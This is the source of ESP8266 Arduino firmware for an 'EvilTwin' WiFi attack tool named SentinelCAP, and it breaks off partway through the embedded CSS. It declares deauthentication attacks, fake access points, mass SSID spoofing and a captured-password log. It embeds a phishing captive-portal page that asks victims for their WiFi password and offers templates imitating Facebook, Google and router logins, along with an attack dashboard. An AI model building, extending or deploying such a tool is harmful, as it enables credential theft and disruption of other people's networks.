// --- Include necessary libraries ---
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h> // For SPIFFS/LittleFS
#include <ArduinoJson.h> // For handling JSON data
#include <Updater.h> // For OTA updates (NEW)

// --- OLED Libraries ---
#include <Wire.h> // Required for I2C communication
#include <Adafruit_GFX.h> // Core graphics library
#include <Adafruit_SSD1306.h> // Hardware-specific library for SSD1306

extern "C" {
#include "user_interface.h" // Required for wifi_promiscuous_enable and wifi_send_pkt_freedom
}

// --- Global Definitions ---
#define APP_NAME "SentinelCAP"
#define DEFAULT_ADMIN_AP_SSID "Linuxhackingid-SentinelCAP" // Default SSID for the admin AP
#define DEFAULT_ADMIN_AP_PASSWORD "Linuxhackingid" // Default password for the admin AP
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); // IP for the admin AP and DNS server

// New: File for permanent password storage
const char CAPTURED_PASSWORDS_FILE[] = "/captured_passwords.log"; // <--- TAMBAHAN BARU

// --- OLED Definitions ---
#define OLED_SDA_PIN D1 // GPIO5 (D1 on NodeMCU)
#define OLED_SCL_PIN D2 // GPIO4 (D2 on NodeMCU)
#define OLED_ADDRESS 0x3C // OLED I2C address
#define SCREEN_WIDTH 128 // OLED display width, in pixels
#define SCREEN_HEIGHT 64 // OLED display height, in pixels

// Declaration for an SSD1306 display connected to I2C (SDA, SCL pins)
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1); // -1 means no reset pin

// --- Web Server and DNS Server Objects ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// --- Global File Object for Upload ---
File fsUploadFile; // Global file object to keep the file open during upload
bool uploadErrorOccurred = false; // Flag for file upload errors <--- TAMBAHAN BARU

// --- Network Structures ---
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  String security; // Added security type
} _Network;

_Network _networks[16]; // Max 16 networks for scan
_Network _selectedNetwork; // Currently selected target network

// --- Global State Variables ---
String _capturedPasswordsLog = ""; // Stores successfully captured passwords (runtime buffer)
bool hotspot_active = false; // Status of Evil Twin hotspot
bool deauthing_active = false; // Status of deauthentication attack
unsigned long lastScanTime = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastWifiStatusCheck = 0;
unsigned long startTime = 0; // For uptime calculation
unsigned long lastOLEDUpdate = 0; // For OLED update interval

// --- New: Global Settings Structure ---
struct AppSettings {
  String adminApSsid;
  String adminApPassword;
  bool enableDebugLogs;
  String defaultCaptivePortalTemplate; // e.g., "default", "facebook", or a filename
  // Add more settings here as needed
};

AppSettings appSettings; // Global instance of settings

// --- Mass Spoofing Variables (NEW) ---
String massSpoofingSSIDs[32]; // Max 32 SSIDs for mass spoofing
int massSpoofingCount = 0;
int currentSpoofingIndex = 0;
bool mass_spoofing_active = false;
unsigned long lastSpoofingChangeTime = 0;
const unsigned long SPOOFING_CHANGE_INTERVAL = 3000; // Change SSID every 3 seconds
uint8_t currentSpoofingChannel = 1; // NEW: For channel hopping
uint8_t spoofingMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01}; // NEW: Base MAC for spoofing

// --- Function Prototypes ---
// Add this extern declaration to ensure appSettings is visible to all functions
extern AppSettings appSettings;

void setup();
void loop();
void clearNetworkArray();
void performScan();
String bytesToStr(const uint8_t* b, uint32_t size);
String getSecurityType(uint8_t encryptionType);

// --- File Serving Handlers ---
bool handleFileRead(String path);
void handleNotFound();

// --- API Handlers (JSON Responses) ---
void handleApiScan();
void handleApiSelectNetwork();
void handleApiToggleDeauth();
void handleApiToggleHotspot();
void handleApiMassSpoofing(); // Modified
void handleApiStopMassSpoofing(); // NEW
void handleApiStatus();
void handleApiLogs();
void handleApiClearLogs();
void handleApiDownloadLogs();
void handleApiFiles(); // New: for file listing
void handleApiDeselectNetwork(); // <--- TAMBAHAN BARU

// --- File Upload/Delete Handlers ---
void handleFileUpload();
void handleFileDelete();

// --- Captive Portal Handlers ---
void handleCaptivePortal();
void handleCaptivePortalSubmit();

// --- System Control ---
void handleRestart();

// --- New: Settings Management Functions ---
void loadSettings();
void saveSettings();
void handleApiGetSettings();
void handleApiSaveSettings();

// --- New: Password Log Management Functions --- <--- TAMBAHAN BARU
void loadCapturedPasswords();
void saveCapturedPasswords();

// --- OLED Update Function ---
void updateOLEDDisplay();

// --- NEW: Mass Spoofing Helper ---
void startMassSpoofingAP(String ssid, uint8_t channel, uint8_t* mac);
void generateRandomMac(uint8_t* mac);

// --- NEW: OTA Update Handlers ---
void handleOTAUpdate();
void handleOTAStart();
void handleOTAProgress(unsigned int progress, unsigned int total);
void handleOTAEnd();
void handleOTAErrors(ota_error_t error);


// --- Embedded File Contents (as String Literals) ---

// captive_portal_template.html
const char CAPTIVE_PORTAL_TEMPLATE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {SSID}</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding-top: 50px; }
        .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h1 { color: #333; }
        input[type="password"] { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background-color: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to {SSID}</h1>
        <p>Please enter your WiFi password to continue.</p>
        <form action="/submit_password" method="post">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
        <p style="font-size: 0.8em; color: #666; margin-top: 20px;">Powered by {DEVICE_NAME}</p>
    </div>
</body>
</html>
)rawliteral";

// index.html
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EvilTwin - SentinelCAP Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="container-wrapper">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <i class="fas fa-crow"></i>
                EvilTwin - SentinelCAP
            </div>
            <button class="menu-toggle" onclick="toggleSidebar()">
                <i class="fas fa-bars"></i>
            </button>
        </header>

        <!-- Sidebar -->
        <nav class="sidebar" id="sidebar">
            <a href="#" class="nav-item active" data-tab="dashboard">
                <i class="fas fa-home"></i>
                Dashboard
            </a>
            <a href="#" class="nav-item" data-tab="scanner">
                <i class="fas fa-wifi"></i>
                Scanner
            </a>
            <a href="#" class="nav-item" data-tab="attack">
                <i class="fas fa-skull-crossbones"></i>
                Attack
            </a>
            <a href="#" class="nav-item" data-tab="captive-editor">
                <i class="fas fa-file-code"></i>
                Captive Portal
            </a>
            <a href="#" class="nav-item" data-tab="filemanager">
                <i class="fas fa-folder-open"></i>
                File Manager
            </a>
            <a href="#" class="nav-item" data-tab="logs">
                <i class="fas fa-clipboard-list"></i>
                Logs
            </a>
            <a href="#" class="nav-item" data-tab="settings">
                <i class="fas fa-cog"></i>
                Settings
            </a>
            <a href="#" class="nav-item" data-tab="firmware-update"> <!-- NEW TAB -->
                <i class="fas fa-upload"></i>
                Firmware Update
            </a>
            <a href="#" class="nav-item" id="reboot-btn">
                <i class="fas fa-power-off"></i>
                Reboot Device
            </a>
        </nav>

        <!-- Main Content -->
        <main class="main-content" id="mainContent">
            <!-- Dashboard Tab -->
            <div id="dashboard-tab" class="tab-content active">
                <div class="status-grid">
                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-bullseye"></i>
                            </div>
                            <div class="card-info">
                                <h3>Target Network</h3>
                                <p id="target-ssid">None Selected</p>
                            </div>
                        </div>
                    </div>

                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-ghost"></i>
                            </div>
                            <div class="card-info">
                                <h3>Evil Twin Status</h3>
                                <p id="hotspot-status"><span class="text-red">Inactive</span></p>
                            </div>
                        </div>
                    </div>

                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-unlink"></i>
                            </div>
                            <div class="card-info">
                                <h3>Deauth Attack</h3>
                                <p id="deauth-status"><span class="text-red">Stopped</span></p>
                            </div>
                        </div>
                    </div>

                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-key"></i>
                            </div>
                            <div class="card-info">
                                <h3>Captured Passwords</h3>
                                <p id="password-count">0</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Welcome to EvilTwin - SentinelCAP</h2>
                    <p style="color: #cccccc; line-height: 1.6;">
                        SentinelCAP is a powerful WiFi penetration testing suite. Use the navigation menu to access different features including network scanning, deauthentication attacks, evil twin hotspots, and captive portal management.
                    </p>
                    <br>
                    <p style="color: #999999; line-height: 1.6;">
                        Current system status is <strong style="color: #ff3333;" id="system-status-text">Idle</strong>. Select a function from the sidebar to begin operations.
                    </p>
                    <div class="quick-actions">
                        <button id="quick-scan-btn" class="action-btn"><i class="fas fa-search"></i> Quick Network Scan</button>
                        <!-- Tombol Deselect dipindahkan ke tab Scanner -->
                        <button id="generate-report-btn" class="action-btn"><i class="fas fa-file-alt"></i> Generate Report</button>
                    </div>
                </div>

                <div class="content-area">
                    <h3 style="color: #ff3333; margin-bottom: 20px;">System Information</h3>
                    <div class="system-info-grid">
                        <div><strong>IP Address:</strong> <span id="ip-address">Loading...</span></div>
                        <div><strong>MAC Address:</strong> <span id="mac-address">Loading...</span></div>
                        <div><strong>Uptime:</strong> <span id="uptime">0h:00m:00s</span></div>
                        <div><strong>Memory Usage:</strong> <span id="memory-percent">0%</span> (<span id="free-heap">0</span>/<span id="total-heap">0</span> bytes free)</div>
                    </div>
                </div>

                <div class="content-area">
                    <h3 style="color: #ff3333; margin-bottom: 20px;">Live Terminal Output</h3>
                    <div class="terminal-output" id="terminal">
                        <div>[INFO] SentinelCAP initialized successfully</div>
                        <div>[INFO] WiFi interface ready</div>
                        <div>[INFO] Web server started on port 80</div>
                    </div>
                </div>
            </div>

            <!-- Scanner Tab -->
            <div id="scanner-tab" class="tab-content">
                <div class="content-area">
                    <div class="flex-header">
                        <h2 style="color: #ff3333;">WiFi Network Scanner</h2>
                        <div>
                            <button id="refresh-scan-btn" class="action-btn"><i class="fas fa-sync-alt"></i> Refresh Scan</button>
                            <!-- Tombol Deselect dipindahkan ke sini -->
                            <button id="deselect-network-btn" class="action-btn red-btn"><i class="fas fa-times-circle"></i> Deselect Network</button>
                        </div>
                    </div>
                    <div class="networks-list" id="networks-list">
                        <p class="text-gray">Scanning for networks...</p>
                    </div>
                </div>
            </div>

            <!-- Attack Tab -->
            <div id="attack-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Attack Tools</h2>
                    <div class="attack-grid">
                        <div class="attack-card">
                            <h3>Deauthentication Attack</h3>
                            <p class="text-gray">Disconnect clients from the target network by sending deauth packets.</p>
                            <button id="deauth-btn" class="action-btn red-btn">Start Deauth Attack</button>
                        </div>
                        <div class="attack-card">
                            <h3>Evil Twin Hotspot</h3>
                            <p class="text-gray">Create a fake access point to capture credentials.</p>
                            <button id="hotspot-btn" class="action-btn purple-btn">Start Evil Twin</button>
                        </div>
                    </div>
                    <div class="mass-spoofing-section">
                        <h3>Mass SSID Spoofing</h3>
                        <p class="text-gray">Broadcast multiple fake SSIDs simultaneously.</p>
                        <textarea id="ssid-list" placeholder="Enter SSIDs (one per line):&#10;Free_WiFi&#10;Starbucks_WiFi&#10;Hotel_Guest"></textarea>
                        <div class="form-group checkbox-group" style="margin-bottom: 15px;">
                            <input type="checkbox" id="mass-spoofing-random-mac">
                            <label for="mass-spoofing-random-mac">Randomize MAC Address</label>
                        </div>
                        <div class="form-group checkbox-group" style="margin-bottom: 15px;">
                            <input type="checkbox" id="mass-spoofing-channel-hop">
                            <label for="mass-spoofing-channel-hop">Channel Hopping (1-11)</label>
                        </div>
                        <button id="mass-spoofing-btn" class="action-btn orange-btn">Start Mass Spoofing</button>
                        <p id="mass-spoofing-status" class="text-red" style="margin-top: 10px;">Inactive</p>
                        <p id="current-spoofed-ssid" class="text-gray" style="font-size: 0.9em;">Current: N/A</p>
                    </div>
                </div>
            </div>

            <!-- Captive Portal Editor Tab -->
            <div id="captive-editor-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Captive Portal Editor</h2>
                    <div class="editor-controls">
                        <select id="template-select">
                            <option value="default">Default Template</option>
                            <option value="facebook">Facebook Login</option>
                            <option value="google">Google WiFi</option>
                            <option value="router">Router Admin</option>
                        </select>
                        <button id="load-template-btn" class="action-btn small-btn"><i class="fas fa-file-import"></i> Load</button>
                        <button id="save-template-btn" class="action-btn small-btn"><i class="fas fa-save"></i> Save Custom</button>
                        <button id="deploy-template-btn" class="action-btn small-btn green-btn"><i class="fas fa-upload"></i> Deploy Live</button>
                    </div>
                    <textarea id="html-editor" class="code-editor"></textarea>
                    <div class="preview-section">
                        <h3>Live Preview</h3>
                        <iframe id="preview-iframe" class="preview-frame" src="about:blank"></iframe>
                        <div class="template-variables">
                            <h4>Template Variables:</h4>
                            <p><code>{SSID}</code> - Target network name</p>
                            <p><code>{DEVICE_NAME}</code> - Device identifier</p>
                            <p><code>{CURRENT_TIME}</code> - Current timestamp</p>
                            <p><code>{CUSTOM_MESSAGE}</code> - Custom message</p>
                        </div>
                    </div>
                </div>
                <div class="content-area">
                    <h3 style="color: #ff3333; margin-bottom: 20px;">Template Library</h3>
                    <div class="template-library-grid" id="template-library">
                        <!-- Templates will be loaded here by JavaScript -->
                    </div>
                </div>
            </div>

            <!-- File Manager Tab -->
            <div id="filemanager-tab" class="tab-content">
                <div class="content-area">
                    <div class="flex-header">
                        <h2 style="color: #ff3333;">File Manager</h2>
                        <button id="show-upload-modal-btn" class="action-btn"><i class="fas fa-upload"></i> Upload File</button>
                    </div>
                    <div class="files-list" id="files-list">
                        <p class="text-gray">No files found on device.</p>
                    </div>
                </div>
            </div>

            <!-- Logs Tab -->
            <div id="logs-tab" class="tab-content">
                <div class="content-area">
                    <div class="flex-header">
                        <h2 style="color: #ff3333;">Captured Passwords</h2>
                        <div>
                            <button id="clear-logs-btn" class="action-btn small-btn red-btn"><i class="fas fa-trash-alt"></i> Clear</button>
                            <button id="download-logs-btn" class="action-btn small-btn green-btn"><i class="fas fa-download"></i> Download</button>
                        </div>
                    </div>
                    <div class="terminal-output" id="password-logs">
                        <div class="text-gray">No passwords captured yet...</div>
                    </div>
                </div>
                <div class="content-area">
                    <h2 style="color: #ff3333;">System Logs</h2>
                    <div class="terminal-output" id="system-logs">
                        <div>[INFO] System started</div>
                        <div>[INFO] Monitoring WiFi networks</div>
                    </div>
                </div>
            </div>

            <!-- Settings Tab -->
            <div id="settings-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Device Settings</h2>
                    <div class="settings-section">
                        <h3>Admin Access Point</h3>
                        <div class="form-group">
                            <label for="admin-ap-ssid">SSID:</label>
                            <input type="text" id="admin-ap-ssid" placeholder="Admin AP SSID">
                        </div>
                        <div class="form-group">
                            <label for="admin-ap-password">Password:</label>
                            <input type="password" id="admin-ap-password" placeholder="Admin AP Password">
                        </div>
                    </div>
                    <div class="settings-section">
                        <h3>Logging & Debug</h3>
                        <div class="form-group checkbox-group">
                            <input type="checkbox" id="enable-debug-logs">
                            <label for="enable-debug-logs">Enable Debug Logs (to Serial)</label>
                        </div>
                    </div>
                    <div class="settings-section">
                        <h3>Captive Portal Default</h3>
                        <div class="form-group">
                            <label for="default-captive-template">Default Template:</label>
                            <select id="default-captive-template">
                                <option value="default">Default Template</option>
                                <option value="facebook">Facebook Login</option>
                                <option value="google">Google WiFi</option>
                                <option value="router">Router Admin</option>
                                <option value="custom">Custom (from uploaded file)</option>
                            </select>
                        </div>
                    </div>
                    <button id="save-settings-btn" class="action-btn green-btn"><i class="fas fa-save"></i> Save Settings</button>
                </div>
            </div>

            <!-- NEW: Firmware Update Tab -->
            <div id="firmware-update-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Firmware Update (OTA)</h2>
                    <p class="text-gray">Upload a new firmware (.bin) file to update the device.</p>
                    <div class="drop-area" id="firmware-drop-area">
                        <i class="fas fa-upload"></i>
                        <p>Drag & Drop .bin file here or click to browse</p>
                        <input type="file" id="firmware-input" accept=".bin" class="hidden-input">
                    </div>
                    <div class="progress-container" style="display: none;">
                        <div class="progress-bar" id="firmware-progress-bar"></div>
                        <div class="progress-text" id="firmware-progress-text">0%</div>
                    </div>
                    <p id="firmware-status-message" class="text-gray" style="margin-top: 15px;"></p>
                </div>
            </div>

            <!-- Footer -->
            <footer class="footer">
                © <span>EvilTwin - SentinelCAP</span>. All Right Reserved. | Firmware By: <span>Linuxhackingid</span>
            </footer>
        </main>
    </div>

    <!-- Upload Modal -->
    <div id="upload-modal" class="modal hidden">
        <div class="modal-content">
            <span class="close-button" onclick="closeUploadModal()">&times;</span>
            <h2>Upload File</h2>
            <div class="drop-area" id="file-drop-area">
                <i class="fas fa-cloud-upload-alt"></i>
                <p>Drag & Drop files here or click to browse</p>
                <input type="file" id="file-input" class="hidden-input">
            </div>
            <button class="action-btn red-btn" id="cancel-upload-btn">Cancel</button>
        </div>
    </div>

    <script src="/script.js"></script>
</body>
</html>
)rawliteral";

// style.css
const char STYLE_CSS[] PROGMEM = R"rawliteral(
/* General Styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #1a1a1a;
    color: #ffffff;
    overflow-x: hidden;
}

.container-wrapper {
    display: flex;
    min-height: 100vh;
}

/* Header */
.header {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    height: 60px;
    background-color: #1a1a1a;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 20px;
    z-index: 1000;
    border-bottom: 1px solid #333;
}

.logo {
    display: flex;
    align-items: center;
    font-size: 20px;
    font-weight: bold;
    color: #ff3333;
}

.logo i {
    margin-right: 8px;
    font-size: 24px;
}

.menu-toggle {
    background: none;
    border: none; /* Hapus border debugging */
    color: #ff3333;
    font-size: 24px; /* Sedikit lebih besar */
    cursor: pointer;
    display: none; /* Hidden on desktop */
    z-index: 1001; /* Pastikan tombol di atas header */
    padding: 5px; /* Tambahkan padding agar mudah diklik */
}

/* Sidebar */
.sidebar {
    width: 250px;
    background-color: #0f0f0f;
    padding-top: 80px;
    position: fixed;
    height: 100vh;
    overflow-y: auto;
    transition: transform 0.3s ease;
    border-right: 1px solid #333;
    z-index: 999; /* Di bawah header, tapi di atas main content */
    /* Default desktop state: visible */
    transform: translateX(0);
}

.nav-item {
    display: flex;
    align-items: center;
    padding: 15px 20px;
    color: #cccccc;
    text-decoration: none;
    transition: all 0.3s ease;
    border-bottom: 1px solid #333;
    cursor: pointer; /* Added cursor pointer */
}

.nav-item:hover,
.nav-item.active {
    background-color: #ff3333;
    color: #ffffff;
}

.nav-item i {
    margin-right: 12px;
    width: 20px;
    text-align: center;
    color: #ff3333;
}

.nav-item:hover i,
.nav-item.active i {
    color: #ffffff;
}

/* Main Content */
.main-content {
    flex: 1;
    margin-left: 250px;
    padding: 80px 30px 30px;
    transition: margin-left 0.3s ease;
}

.main-content.expanded {
    margin-left: 0;
}

/* Status Cards */
.status-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

.status-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #444;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.status-card:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 20px rgba(255, 51, 51, 0.2);
}

.card-header {
    display: flex;
    align-items: center;
    margin-bottom: 15px;
}

.card-icon {
    width: 40px;
    height: 40px;
    background-color: #ff3333;
    border-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-right: 15px;
    color: #ffffff;
    font-size: 18px;
}

.card-info h3 {
    color: #999999;
    font-size: 14px;
    margin-bottom: 5px;
    font-weight: normal;
}

.card-info p {
    color: #ffffff;
    font-size: 18px;
    font-weight: bold;
}

/* Content Area */
.content-area {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 30px;
    border: 1px solid #444;
    min-height: 150px; /* Adjusted min-height */
    margin-bottom: 30px;
}

/* Quick Actions */
.quick-actions {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
    margin-top: 25px;
}

.action-btn {
    background-color: #333;
    color: #fff;
    border: none;
    padding: 12px 20px;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
    transition: background-color 0.3s ease, transform 0.2s ease;
    display: flex;
    align-items: center;
    gap: 8px;
}

.action-btn:hover {
    background-color: #ff3333;
    transform: translateY(-2px);
}

.action-btn.red-btn { background-color: #dc3545; }
.action-btn.red-btn:hover { background-color: #c82333; }
.action-btn.purple-btn { background-color: #6f42c1; }
.action-btn.purple-btn:hover { background-color: #563d7c; }
.action-btn.orange-btn { background-color: #fd7e14; }
.action-btn.orange-btn:hover { background-color: #e66a00; }
.action-btn.green-btn { background-color: #28a745; }
.action-btn.green-btn:hover { background-color: #218838; }
.action-btn.small-btn {
    padding: 8px 15px;
    font-size: 14px;
}

/* System Info Grid */
.system-info-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px;
    color: #cccccc;
}

.system-info-grid strong {
    color: #ff3333;
}

/* Terminal Output */
.terminal-output {
    background-color: #111;
    border: 1px solid #333;
    border-radius: 5px;
    padding: 15px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 14px;
    color: #00ff41; /* Green text for terminal */
    max-height: 300px;
    overflow-y: auto;
    white-space: pre-wrap; /* Preserve whitespace and wrap text */
    word-break: break-all; /* Break long words */
}

.terminal-output div {
    margin-bottom: 5px;
}

/* Scanner Tab */
.networks-list .network-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 10px;
    border: 1px solid #444;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: background-color 0.3s ease;
}

.networks-list .network-card:hover {
    background-color: #3a3a3a;
}

.networks-list .network-card .ssid-info {
    display: flex;
    align-items: center;
    gap: 10px;
}

.networks-list .network-card .ssid-info .signal-icon {
    font-size: 24px;
    color: #ff3333;
}

.networks-list .network-card .details {
    text-align: right;
}

.networks-list .network-card .details .text-gray {
    color: #999;
    font-size: 13px;
}

.networks-list .network-card .select-btn {
    background-color: #ff3333;
    color: #fff;
    border: none;
    padding: 8px 15px;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.networks-list .network-card .select-btn:hover {
    background-color: #cc0000;
}

.networks-list .network-card.selected {
    border: 2px solid #ff3333;
    box-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
}

/* Attack Tab */
.attack-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

.attack-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #444;
}

.attack-card h3 {
    color: #ff3333;
    margin-bottom: 10px;
}

.attack-card .action-btn {
    width: 100%;
    margin-top: 15px;
}

.mass-spoofing-section {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #444;
}

.mass-spoofing-section h3 {
    color: #ff3333;
    margin-bottom: 10px;
}

.mass-spoofing-section textarea {
    width: 100%;
    height: 120px;
    background-color: #111;
    border: 1px solid #444;
    border-radius: 5px;
    padding: 10px;
    color: #fff;
    font-family: 'Consolas', 'Monaco', monospace;
    resize: vertical;
    margin-bottom: 15px;
}

/* Captive Portal Editor */
.editor-controls {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 20px;
    align-items: center;
}

.editor-controls select,
.editor-controls input[type="text"] {
    background-color: #111;
    border: 1px solid #444;
    color: #fff;
    padding: 8px 10px;
    border-radius: 5px;
    flex-grow: 1;
    min-width: 150px;
}

.code-editor {
    width: 100%;
    height: 400px;
    background-color: #111;
    border: 1px solid #444;
    border-radius: 5px;
    padding: 15px;
    color: #fff;
    font-family: 'Consolas', 'Monaco', monospace;
    resize: vertical;
    margin-bottom: 20px;
}

.preview-section h3 {
    color: #ff3333;
    margin-bottom: 10px;
}

.preview-frame {
    width: 100%;
    height: 300px;
    border: 1px solid #444;
    border-radius: 5px;
    background-color: #fff; /* Background for the iframe content */
}

.template-variables {
    background-color: #111;
    border: 1px solid #444;
    border-radius: 5px;
    padding: 15px;
    margin-top: 20px;
}

.template-variables h4 {
    color: #ff3333;
    margin-bottom: 10px;
}

.template-variables p {
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    color: #cccccc;
    margin-bottom: 5px;
}

.template-variables code {
    color: #66ccff; /* Light blue for code */
}

.template-library-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px;
}

.template-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 15px;
    border: 1px solid #444;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.template-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
}

.template-card h4 {
    color: #ff3333;
    margin-bottom: 5px;
}

.template-card p {
    color: #999;
    font-size: 13px;
    margin-bottom: 10px;
}

.template-card .template-actions {
    display: flex;
    gap: 10px;
}

/* File Manager */
.files-list .file-item {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 10px;
    border: 1px solid #444;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: background-color 0.3s ease;
}

.files-list .file-item:hover {
    background-color: #3a3a3a;
}

.files-list .file-item .file-info {
    display: flex;
    align-items: center;
    gap: 10px;
}

.files-list .file-item .file-icon {
    font-size: 24px;
    color: #66ccff; /* Light blue for file icons */
}

.files-list .file-item .file-details h4 {
    color: #fff;
    margin-bottom: 3px;
}

.files-list .file-item .file-details p {
    color: #999;
    font-size: 13px;
}

.files-list .file-item .file-actions {
    display: flex;
    gap: 10px;
}

/* Logs Tab */
.text-gray {
    color: #999;
}

/* Settings Tab */
.settings-section {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #444;
    margin-bottom: 20px;
}

.settings-section h3 {
    color: #ff3333;
    margin-bottom: 15px;
}

.form-group {
    margin-bottom: 15px;
}

.form-group label {
    display: block;
    color: #cccccc;
    margin-bottom: 8px;
    font-weight: bold;
}

.form-group input[type="text"],
.form-group input[type="password"],
.form-group select {
    width: 100%;
    padding: 10px;
    background-color: #111;
    border: 1px solid #444;
    border-radius: 5px;
    color: #fff;
    font-size: 16px;
}

.form-group input[type="checkbox"] {
    margin-right: 10px;
    width: auto; /* Override 100% width */
}

.form-group.checkbox-group {
    display: flex;
    align-items: center;
}

/* Firmware Update Tab */
.progress-container {
    width: 100%;
    background-color: #333;
    border-radius: 5px;
    margin-top: 20px;
    overflow: hidden;
    position: relative;
    height: 25px;
}

.progress-bar {
    height: 100%;
    width: 0%;
    background-color: #28a745;
    border-radius: 5px;
    text-align: center;
    line-height: 25px;
    color: white;
    transition: width 0.3s ease;
}

.progress-text {
    position: absolute;
    width: 100%;
    text-align: center;
    line-height: 25px;
    color: white;
    font-weight: bold;
}


/* Footer */
.footer {
    margin-top: auto;
    padding: 20px 30px;
    text-align: center;
    color: #666666;
    font-size: 14px;
    border-top: 1px solid #333;
}

.footer span {
    color: #ff3333;
}

/* Tab Content */
.tab-content {
    display: none;
}

.tab-content.active {
    display: block;
    animation: fadeIn 0.6s ease-out;
}

/* Modal */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1001; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgba(0,0,0,0.7); /* Black w/ opacity */
    justify-content: center;
    align-items: center;
}

.modal-content {
    background-color: #2a2a2a;
    margin: auto;
    padding: 30px;
    border: 1px solid #444;
    border-radius: 10px;
    width: 80%;
    max-width: 500px;
    position: relative;
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    animation: slideIn 0.3s ease-out;
}

.modal-content h2 {
    color: #ff3333;
    margin-bottom: 20px;
    text-align: center;
}

.close-button {
    color: #aaa;
    position: absolute;
    top: 10px;
    right: 15px;
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
}

.close-button:hover,
.close-button:focus {
    color: #ff3333;
    text-decoration: none;
    cursor: pointer;
}

.drop-area {
    border: 2px dashed #ff3333;
    border-radius: 8px;
    padding: 40px;
    text-align: center;
    cursor: pointer;
    margin-bottom: 20px;
    transition: background-color 0.3s ease, border-color 0.3s ease;
}

.drop-area:hover {
    background-color: #3a3a3a;
    border-color: #fff;
}

.drop-area i {
    font-size: 50px;
    color: #ff3333;
    margin-bottom: 15px;
}

.drop-area p {
    color: #cccccc;
    font-size: 16px;
}

.hidden-input {
    display: none;
}

/* Responsive Design */
@media (max-width: 768px) {
    .menu-toggle {
